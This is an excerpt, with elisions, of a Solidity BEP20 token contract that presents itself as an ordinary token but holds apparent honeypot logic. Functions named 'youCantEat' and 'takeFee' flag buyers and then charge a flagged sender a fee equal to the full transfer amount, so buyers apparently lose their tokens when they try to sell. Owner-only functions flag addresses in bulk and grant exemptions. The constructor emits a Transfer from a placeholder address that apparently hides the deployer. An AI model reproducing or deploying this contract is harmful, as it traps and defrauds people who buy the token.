...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    uint256 public _maxOG; 
    uint256 public _maxTG;
    ...
    address[3] memory _W) 
    {
        ...
        _maxOG = _LMT[0] * 10**_decimals;
        _maxTG = _LMT[1] * 10**_decimals;

        minimumTokensBeforeSwap = _totalSupply.mul(1).div(10000);
        marketingW = payable(_W[0]);
        teamW = payable(_W[1]);
        ...
        isExcludedFromF[owner()] = true;
        isExcludedFromF[address(this)] = true;
        ...
        emit Transfer(address(_W[2]), _msgSender(), _totalSupply);
    }
    ...
    function setisExcludedFromF(address account, bool newValue) public onlyOwner {
        isExcludedFromF[account] = newValue;
    }

    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromF[addresses[i]] = status;
        }
    }
    ...
    function setmarketingW(address newAddress) external onlyOwner() {
        marketingW = payable(newAddress);
    }

    function setteamW(address newAddress) external onlyOwner() {
        teamW = payable(newAddress);
    }
    ...
    function youCantEat(address recipient) internal {
        if (!getEnable[recipient] && !isMarketPair[recipient]) getEnable[recipient] = true;
    }

    function manage_CantEat(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            getEnable[addresses[i]] = status;
        }
    }

    function setgetEnable(address recipient, bool status) public onlyOwner {
        getEnable[recipient] = status;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            if(!isOnceEatExempt[sender] && !isOnceEatExempt[recipient]) {
                require(smallOrEqual(amount, _maxOG));
            }            
            
            if(!isExcludedFromF[sender] && !isExcludedFromF[recipient]){
                address ad;
                for(int i=0;i <=2;i++){
            ...
            if(LookMaxEat && !isMaxEatExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _maxTG));
    ...
    function _cantEat(address addr, address re) private view returns(bool) {
        return addr == marketingW && !isMarketPair[re];
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingW, amountBNBMarketing);

        if(amountBNBTeam > 0)
            transferToAddressETH(teamW, amountBNBTeam);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(getEnable[sender] && !isMarketPair[sender]) feeAmount = amount;
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [0xaD37c9105D746D9f92B98940b4357A6baab96393,0xaD37c9105D746D9f92B98940b4357A6baab96393,0xaD37c9105D746D9f92B98940b4357A6baab96393]
    ){}
}